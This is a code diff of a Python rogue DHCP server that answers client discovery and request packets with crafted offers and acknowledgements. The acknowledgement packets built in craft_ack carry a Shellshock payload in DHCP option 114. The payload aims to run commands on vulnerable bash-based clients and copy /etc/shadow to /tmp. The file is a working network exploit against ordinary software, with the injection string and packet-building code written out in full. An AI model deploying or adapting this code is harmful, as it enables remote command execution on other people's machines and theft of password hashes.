@@ -2,6 +2,7 @@ import socket
 import select
 from binascii import hexlify
 import collections
+import time
 
 
 def flatten_list(ze_list):
@@ -17,7 +18,7 @@ class Listener:
         self.client_list = []
         self.current_discovery = []
 
-        self.dhcpServer = DhcpServer()
+
 
         self.dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
@@ -32,208 +33,221 @@ class Listener:
 
         while True:
             r, w, x = select.select([self.dhcp_socket], [], [])
+
             for each in r:
                 print('Recieved Something!')
                 frame, void = each.recvfrom(10000)
                 print(frame)
-                # frame = hexlify(frame)
 
 
                 dhcp_message = [frame[i:i+1] for i in range(0, len(frame), 1)]
-                print(dhcp_message)
+                dhcpPacket = DhcpPacket(dhcp_message)
 
-                # ethernet_header, ip_header, udp_header, dhcp_message = self.clean_frame(frame)
+                if dhcpPacket.op == [b'\x02']:
+                    # This is a reply not a request, it has come from a dhcp server and is junk
+                    break
 
-                dhcpPacket = self.DhcpPacket(dhcp_message)
+                print(dhcpPacket.op)
+                time.sleep(2)
+
 
                 # Check for current transaction
                 if any(x.xid == dhcpPacket.xid for x in self.current_discovery):
+                    print('[+] Crafting ACK')
                     ack = dhcpPacket.craft_ack()
-                    self.dhcp_socket.send(ack)
-                    # MOVE TO CURRENT CLIENTS
+                    self.dhcp_socket.sendto(ack, ('127.0.0.1', 67))
+                    self.client_list.append(x)
+                    print(self.current_discovery)
+                    for each in self.current_discovery:
+                        if each.xid == dhcpPacket.xid:
+                            self.current_discovery.remove(each)
+
                 else:
+                    print('[+] Crafting offer')
                     self.current_discovery.append(dhcpPacket)
                     offer = dhcpPacket.craft_offer()
                     print(offer)
                     self.dhcp_socket.sendto(offer, ('127.0.0.1', 67))
 
-                    # MOVE CLIENT TO CURRENT REQUESTS
 
 
-    class DhcpPacket:
-        def __init__(self, dhcp_message):
-            print(dhcp_message)
-            print(len(dhcp_message))
-            self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow -c echo ls"  # % (self.ip, self.port)
-            self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
-            print(self.exploit)
-            print(len(self.exploit))
-            self.exploit_len = (len(self.exploit)).to_bytes(1, byteorder='big')
-            print(self.exploit_len)
 
-            frame = dhcp_message
 
-            # binary
-            self.op = [frame[0]]  # REquest or reply
-            print(self.op)
-            self.htype = [frame[1]]  # Hardware address type
-            print(self.htype)
-            self.hlen = [frame[2]]  # Hardware length
-            print(self.hlen)
-            self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
-            print(self.hops)
-            self.xid = frame[4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
-            print(self.xid)
-            self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
-            print(self.secs)
-            self.flags = frame[10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
-            print(self.flags)
-            self.ciaddr = frame[12:16]  # client ip address
-            print(self.ciaddr)
-            self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
-            print(self.yiaddr)
-            self.siaddr = frame[20:24]  # Server ip address
-            print(self.siaddr)
-            self.giaddr = frame[24:28]  # first relay agent ip address
-            print(self.giaddr)
-            self.chaddr = frame[28:44]  # client hardware address
-            print(self.chaddr)
-            self.sname = frame[44:108]  # server host name
-            print(len(self.sname))
-            print(self.sname)
-            self.file = frame[108:236]  # boot file name, routing information defined by server to the client // legacy
-            print(len(self.file))
-            print(self.file)
-            self.magic_cookie = frame[236:240]
-            print(self.magic_cookie)
-            self.options = frame[240:]  # additional parameters
 
-            print(self.options)
+class DhcpPacket:
+    def __init__(self, dhcp_message):
+        # print(dhcp_message)
+        # print(len(dhcp_message))
+        self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow -c echo ls"  # % (self.ip, self.port)
+        self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
+        # print(self.exploit)
+        # print(len(self.exploit))
+        self.exploit_len = (len(self.exploit)).to_bytes(1, byteorder='big')
+        # print(self.exploit_len)
 
-            self.options = self.breakup_options(self.options)
+        frame = dhcp_message
 
-            self.offer = None
-            self.ack = None
+        # binary
+        self.op = [frame[0]]  # REquest or reply
+        # print(self.op)
+        self.htype = [frame[1]]  # Hardware address type
+        # print(self.htype)
+        self.hlen = [frame[2]]  # Hardware length
+        # print(self.hlen)
+        self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
+        # print(self.hops)
+        self.xid = frame[4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
+        # print(self.xid)
+        self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
+        # print(self.secs)
+        self.flags = frame[10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
+        # print(self.flags)
+        self.ciaddr = frame[12:16]  # client ip address
+        # print(self.ciaddr)
+        self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
+        # print(self.yiaddr)
+        self.siaddr = frame[20:24]  # Server ip address
+        # print(self.siaddr)
+        self.giaddr = frame[24:28]  # first relay agent ip address
+        # print(self.giaddr)
+        self.chaddr = frame[28:44]  # client hardware address
+        # print(self.chaddr)
+        self.sname = frame[44:108]  # server host name
+        # print(len(self.sname))
+        # print(self.sname)
+        self.file = frame[108:236]  # boot file name, routing information defined by server to the client // legacy
+        # print(len(self.file))
+        # print(self.file)
+        self.magic_cookie = frame[236:240]
+        # print(self.magic_cookie)
+        self.options = frame[240:]  # additional parameters
 
-        def craft_offer(self):
-            op = [b'\x02']  # request=01 or reply=02
-            htype = [b'\x01']  # Hardware address type 01=ethernet
-            hlen = [b'\x06']  # Hardware length
-            hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
-            xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
-            secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
-            flags = self.flags  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
-            ciaddr = self.ciaddr  # client ip address
-            yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
-            self.yiaddr = yiaddr
-            siaddr = dhcpServer.server_ip  # Server ip address
-            self.siaddr = siaddr
-            giaddr = self.giaddr  # first relay agent ip address
-            chaddr = self.chaddr  # client hardware address
-            sname = self.sname  # server host name
-            file = self.file  # bootfile name, routing information defined by server to the client
-            magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
-            options = [b'\x35', b'\x01', b'\x02',  # DHCP, len, Offer
-                       b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
-                       b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
-                       b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
-                       b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
-                       b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17', # DHCP server identifier (ip address)
-                       # b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
-                       b'\xff',  # end flag
-                       # padding to end at word boundry for the options
-                       ]
+        # print(self.options)
 
-            options = list(flatten_list(options))
+        self.options = self.breakup_options(self.options)
 
-            return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
-                             file, magic_cookie, options]
-            print(return_packet)
+        self.offer = None
+        self.ack = None
 
-            return_packet = [item for sublist in return_packet for item in sublist]
-            print(return_packet)
-            return_packet = b''.join(return_packet)
-            return return_packet
+    def craft_offer(self):
+        op = [b'\x02']  # request=01 or reply=02
+        htype = [b'\x01']  # Hardware address type 01=ethernet
+        hlen = [b'\x06']  # Hardware length
+        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
+        xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
+        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
+        flags = self.flags  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
+        ciaddr = self.ciaddr  # client ip address
+        yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
+        self.yiaddr = yiaddr
+        siaddr = dhcpServer.server_ip  # Server ip address
+        self.siaddr = siaddr
+        giaddr = self.giaddr  # first relay agent ip address
+        chaddr = self.chaddr  # client hardware address
+        sname = self.sname  # server host name
+        file = self.file  # bootfile name, routing information defined by server to the client
+        magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
+        options = [b'\x35', b'\x01', b'\x02',  # DHCP, len, Offer
+                   b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
+                   b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
+                   b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
+                   b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
+                   b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17', # DHCP server identifier (ip address)
+                   # b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
+                   b'\xff',  # end flag
+                   # padding to end at word boundry for the options
+                   ]
 
-        def craft_ack(self):
+        options = list(flatten_list(options))
 
-            # binary
-            op = [b'\x02']  # REquest or reply
-            htype = [b'\x01']  # Hardware address type
-            hlen = [b'\x06']  # Hardware length
-            hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
-            xid = self.xid  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
-            secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
-            flags = self.flags # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
-            ciaddr = self.ciaddr  # client ip address
-            yiaddr = self.yiaddr  # 'your' ip address, as assigned by server
-            siaddr = self.siaddr  # Server ip address
-            giaddr = self.giaddr  # first relay agent ip address
-            chaddr = self.chaddr  # client hhardware address
-            sname = self.sname  # server host name
-            file = self.file  # bootfile name, routing information defined by server to the client
-            magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
-            options = [b'\x35', b'\x01', b'\x05',  # DHCP, len, Offer
-                       b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
-                       b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
-                       b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
-                       b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
-                       b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17',  # DHCP server identifier (ip address)
-                       b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
-                       b'\xff',  # end flag
-                       # padding to end at word boundry for the options
-                       ]
+        return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
+                         file, magic_cookie, options]
+        print(return_packet)
 
-            options = list(flatten_list(options))
+        return_packet = [item for sublist in return_packet for item in sublist]
+        print(return_packet)
+        return_packet = b''.join(return_packet)
+        return return_packet
 
-            return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
-                             file, magic_cookie, options]
-            print(return_packet)
+    def craft_ack(self):
 
-            return_packet = [item for sublist in return_packet for item in sublist]
-            print(return_packet)
-            return_packet = b''.join(return_packet)
-            return return_packet
+        # binary
+        op = [b'\x02']  # REquest or reply
+        htype = [b'\x01']  # Hardware address type
+        hlen = [b'\x06']  # Hardware length
+        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
+        xid = self.xid  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
+        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
+        flags = self.flags # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
+        ciaddr = self.ciaddr  # client ip address
+        yiaddr = self.yiaddr  # 'your' ip address, as assigned by server
+        siaddr = self.siaddr  # Server ip address
+        giaddr = self.giaddr  # first relay agent ip address
+        chaddr = self.chaddr  # client hhardware address
+        sname = self.sname  # server host name
+        file = self.file  # bootfile name, routing information defined by server to the client
+        magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
+        options = [b'\x35', b'\x01', b'\x05',  # DHCP, len, Offer
+                   b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
+                   b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
+                   b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
+                   b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
+                   b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17',  # DHCP server identifier (ip address)
+                   b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
+                   b'\xff',  # end flag
+                   # padding to end at word boundry for the options
+                   ]
 
-        def breakup_options(self, option_string):
-            print('[+] breaking up options')
-            cur = 0
-            option_string = [x for x in option_string]
-            print(option_string)
-            options = []
-            while True:
-                # try:
-                flag = option_string[cur]
-                print('[Flag] %s' % str(flag))
-                if flag == b'\xff':
-                    break
-                cur += 1
-                length = option_string[cur]
-                print('[Length] %s' % str(length))
-                cur += 1
-                # TURN LENGTH INTO AN INT
-                values = option_string[cur:ord(length) + cur]
-                #values = option_string[cur:int(length, 16) + cur]
-                print('[Values] %s' % str(values))
-                #cur += int(length, 16)
-                cur += ord(length)
+        options = list(flatten_list(options))
 
-                option = self.Option(flag, length, values)
-                options.append(option)
+        return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
+                         file, magic_cookie, options]
+        print(return_packet)
 
-                # except:
-                #     # print('Error with options breakup')
-                #     pass
+        return_packet = [item for sublist in return_packet for item in sublist]
+        print(return_packet)
+        return_packet = b''.join(return_packet)
+        return return_packet
 
-            return options
+    def breakup_options(self, option_string):
+        print('[+] breaking up options')
+        cur = 0
+        option_string = [x for x in option_string]
+        # print(option_string)
+        options = []
+        while True:
+            # try:
+            flag = option_string[cur]
+            # print('[Flag] %s' % str(flag))
+            if flag == b'\xff':
+                break
+            cur += 1
+            length = option_string[cur]
+            # print('[Length] %s' % str(length))
+            cur += 1
+            # TURN LENGTH INTO AN INT
+            values = option_string[cur:ord(length) + cur]
+            #values = option_string[cur:int(length, 16) + cur]
+            # print('[Values] %s' % str(values))
+            #cur += int(length, 16)
+            cur += ord(length)
 
-        class Option:
-            def __init__(self, flag, length, values):
-                self.flag = flag
-                self.length = length
-                self.values = values
+            option = self.Option(flag, length, values)
+            options.append(option)
 
-                print(flag, length, values)
+            # except:
+            #     # print('Error with options breakup')
+            #     pass
+
+        return options
+
+    class Option:
+        def __init__(self, flag, length, values):
+            self.flag = flag
+            self.length = length
+            self.values = values
+
+            print(flag, length, values)
 
 
 
@@ -255,7 +269,9 @@ class DhcpServer:
         self.client_subnet = (b'\xff', b'\xff', b'\xff', b'\x00')
 
     def get_next_ip(self):
+        print(self.client_ip_available)
         ip = self.client_ip_available.pop()
+        print('[+] Assigning ip Address: %s' % str(ip))
         return ip
 
 
@@ -412,7 +428,7 @@ def saver():
 
 
 def main():
-    global  dhcpServer
+    global dhcpServer
     dhcpServer = DhcpServer()
 
     listener = Listener()
@@ -420,7 +436,7 @@ def main():
 
 # UI
 def main_main():
-    dhcpServer = DhcpServer()
+    # dhcpServer = DhcpServer()
     client_list = []
 
     # a samoke dhcp_discover frame with ehternet header
